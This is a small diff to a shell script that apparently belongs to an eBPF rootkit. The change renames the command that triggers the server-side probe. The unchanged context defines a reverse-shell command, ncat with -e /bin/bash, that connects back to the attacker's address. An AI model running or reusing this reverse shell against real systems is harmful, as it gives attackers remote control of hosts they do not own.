@@ -58,8 +58,8 @@ RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
 # Trigger is used to fire the eBPF probe on the server.
 trigger(){
     sleep 1
-    # ./trigger <source-ip> <target-ip> <port>
-    ./trigger ${SRC_ADDR} ${DST_ADDR} ${DST_PORT}
+    # ./bookit-boop <source-ip> <target-ip> <port>
+    ./boopkit-boop ${SRC_ADDR} ${DST_ADDR} ${DST_PORT}
 }
 
 # Check for permissions to host a local socket.
